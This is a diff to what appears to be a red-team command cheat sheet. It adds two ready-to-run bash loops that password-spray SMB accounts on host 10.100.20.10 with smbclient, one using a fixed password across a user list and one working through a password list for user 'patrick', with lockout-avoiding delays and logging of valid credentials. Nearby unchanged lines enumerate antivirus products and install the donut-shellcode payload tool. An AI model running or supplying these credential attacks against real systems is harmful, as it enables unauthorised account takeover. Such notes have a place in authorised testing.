@@ -54,6 +54,10 @@ Poweshell Contrained Language Mode
 Antivirus Info
   WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntivirusProduct Get displayName
 
+Password Spray
+  User scan: sleep=5; passwd='Password123!@#'; for i in $(cat users.txt); do smbclient -U $i%$passwd -L //10.100.20.10 && echo $i:$passwd | tee -a ./valid.txt; sleep $sleep; done
+  Passwd scan: sleep=1500; user='patrick'; for i in $(cat passwd.txt); do smbclient -U $user%$i -L //10.100.20.10 && echo $user:$i | tee -a ./valid.txt; sleep $sleep; done
+
 Donut
   Remove old versions: pip3 uninstall donut-shellcode
   Install: pip3 install donut-shellcode
